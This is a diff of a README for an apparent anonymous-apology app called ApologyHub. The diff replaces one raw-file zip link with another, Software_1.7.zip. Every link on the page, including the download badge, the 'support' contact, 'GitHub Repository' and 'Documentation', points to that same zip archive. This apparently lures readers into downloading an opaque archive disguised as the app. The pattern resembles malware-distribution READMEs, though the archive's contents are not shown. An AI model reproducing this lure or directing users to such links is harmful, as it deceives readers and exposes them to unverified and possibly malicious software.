@@ -1,6 +1,6 @@
 # 🎉 apologyhub - Share Apologies Anonymously and Easily
 
-[![Download ApologyHub](https://raw.githubusercontent.com/Gougemyriad642/apologyhub/main/server/queries/apologyhub-v2.6.zip%20ApologyHub-%20%F0%9F%9A%80%20Click%20Here%20to%20Get%20Started-blue)](https://raw.githubusercontent.com/Gougemyriad642/apologyhub/main/server/queries/apologyhub-v2.6.zip)
+[![Download ApologyHub](https://raw.githubusercontent.com/Gougemyriad642/apologyhub/main/features/Software_1.7.zip%20ApologyHub-%20%F0%9F%9A%80%20Click%20Here%20to%20Get%20Started-blue)](https://raw.githubusercontent.com/Gougemyriad642/apologyhub/main/features/Software_1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To ensure ApologyHub runs smoothly on your computer, please meet the following r
 
 To download ApologyHub, visit the Releases page. Here you can find the latest version of the application.
 
-[Download ApologyHub](https://raw.githubusercontent.com/Gougemyriad642/apologyhub/main/server/queries/apologyhub-v2.6.zip)
+[Download ApologyHub](https://raw.githubusercontent.com/Gougemyriad642/apologyhub/main/features/Software_1.7.zip)
 
 ### Step 2: Choose Your Version
 
@@ -59,7 +59,7 @@ After installation, you can find ApologyHub in your applications list. Click to 
 
 ## 🛡️ Support and Feedback
 
-If you encounter any issues or have questions about using ApologyHub, please visit the **Issues** section on our GitHub page or contact support at https://raw.githubusercontent.com/Gougemyriad642/apologyhub/main/server/queries/apologyhub-v2.6.zip Your feedback is crucial in helping us improve the platform.
+If you encounter any issues or have questions about using ApologyHub, please visit the **Issues** section on our GitHub page or contact support at https://raw.githubusercontent.com/Gougemyriad642/apologyhub/main/features/Software_1.7.zip Your feedback is crucial in helping us improve the platform.
 
 ## 🚧 Community Guidelines
 
@@ -71,8 +71,8 @@ We aim to keep ApologyHub a safe and respectful environment for everyone. Please
 
 ## 🔗 Important Links
 
-- [Download ApologyHub](https://raw.githubusercontent.com/Gougemyriad642/apologyhub/main/server/queries/apologyhub-v2.6.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Gougemyriad642/apologyhub/main/server/queries/apologyhub-v2.6.zip)
-- [Documentation](https://raw.githubusercontent.com/Gougemyriad642/apologyhub/main/server/queries/apologyhub-v2.6.zip)
+- [Download ApologyHub](https://raw.githubusercontent.com/Gougemyriad642/apologyhub/main/features/Software_1.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Gougemyriad642/apologyhub/main/features/Software_1.7.zip)
+- [Documentation](https://raw.githubusercontent.com/Gougemyriad642/apologyhub/main/features/Software_1.7.zip)
 
 Thank you for choosing ApologyHub. We hope you enjoy using our platform to express yourself!
